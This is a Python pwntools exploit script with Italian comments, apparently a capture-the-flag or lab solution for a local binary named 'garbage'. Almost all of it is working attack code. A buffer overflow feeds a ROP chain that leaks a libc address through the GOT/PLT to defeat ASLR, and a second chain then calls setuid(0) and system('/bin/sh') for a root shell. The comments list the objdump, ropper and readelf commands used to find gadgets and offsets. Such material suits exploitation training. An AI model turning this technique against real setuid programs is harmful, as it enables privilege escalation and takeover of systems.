#In questo caso ho ASRL attivo e quindi devo superarlo uso GOT PLT  (global offset table procedure linkage table) vedere cos'è (ha dentro gli indirizzi della libc, 
#quando il programma incontra una funzione vede se  la trova dentro la GOT)
#./garbage, vedo quanti char mi servono

from pwn import *

context(os = "Linux", arch="amd64")

#p.process("./garbage")

p = gdb.debug("./garbage", "b main")

#buffer per buffer overflow sempre con pattern create e pattern search
buf = b"A"*136


"""
prima cosa TROVARE LE FUNZIONI DI LIBC CHE SONO USATE NEL PROGRAMMA!!!!
In questo caso  faccio disass main in gdb e vedo che posso usare
 -puts
 -printf
usiamo printf perchè puts non va
"""

#mi serve trovare l'offset got_puts e di plt_printf

# questo lo trovo con objdump -D garbage | grep  puts e prendo il primo offset puts@plt (0x401050)
got_puts = p64(0x401050)

#objdump -D garbage | grep  printf e vedo printf@GLIBC... (0x404048)  (i need the global address GLIBC)
plt_printf= p64(0x404048)

#mi serve pop_rdi  perchè devo passare a puts la got address di printf

#ropper --file garbage --search "pop rdi; ret;" (controllare poi)
pop_rdi = p64(0x40179b)


#offset del main objdump -D garbage | grep "main"
#mi serve per tornare indietro nel main e rieseguire il buffer overflow se no quando trovo l'indirizzo l'esecuzione si ferma e se riavvio il programma cambiano tutti gli indirizzi
#non prendere il primo perchè è quello della libc quindi devo prendere quello sotto 
main = p64(0x401619)


#step 1 memory leak per ottenere info sulla memoria
#gotprintf è l'argomento per la printf di dopo
payload = buf + pop_rdi + plt_printf + got_puts  + main
p.sendline(payload)

#rimango in ascolto finchè non arrivo a access denied
p.recvuntil(b"access denied.\n")

#leggo fino all'ultimo carattere (con -1 tolgo il newline \n se no non leggo bene l'indirizzo)
#ljust lo mette nella forma 8 byte e aggiunge i null byte quando manca qualcosa
#faccio l'unpack
leaked_printf_address = u64(p.recvline()[:-1].ljust(8, b'\x00'))

#print in hex
print("leaked_printf_address: 0x%x " % leaked_printf_address)



#ldd garbage per trovare il path di libc
#readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep printf
libc_printf =  0x606f0

offset = leaked_printf_address - libc_printf

#sempre con readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system
libc_system = p64(offset + 0x50d70)


#strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh
libc_binsh = p64(offset + 0x1d8678)

print("lib_system ")


#per allinear lo stack mi serve una ret
#ropper --file=garbage --search "ret;"     altrimenti la cerco dentro libc

ret=p64(0x401016)


#readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep setuid
libc_setuid = p64(offset + 0xec0d)
uid=p64(0)

payload = buf + pop_rdi + uid + libc_setuid + pop_rdi + libc_binsh + libc_system

p.sendline(payload)




#così non si ferma il programma, se non lo metto lo script pyhton finisce e il debug si chiude
p.interactive()

#cosa faccio
#b main
#disass auth
#break indirizzo ret di auth
#c
#break main 


#usa ghidra per vedere quale funziona usa strcpy() 
#metti un breakpoint sulla ret di auth

#step 2 eseguo l'exploit per eseguire system per esempio





#posso anche fare una privilege escalation (innanzitutto devo fare chown root:root garbage e poi chmod 4777 garbage per settarlo che viene eseguito come root in ogni caso )
#trovo con readelf setuid() e gli passo 0 così prendo i permessi di root
"""

payload = buf + ret + pop_rdi+ p64(0) + libc_setuid 
payload += pop_rdi + libc_binsh +libc_system

"""

#step 2 exploit

#per eseguire di nuovo il payload devo riportare il programma nel main all'inizio in modo da eseguire un nuovo payload
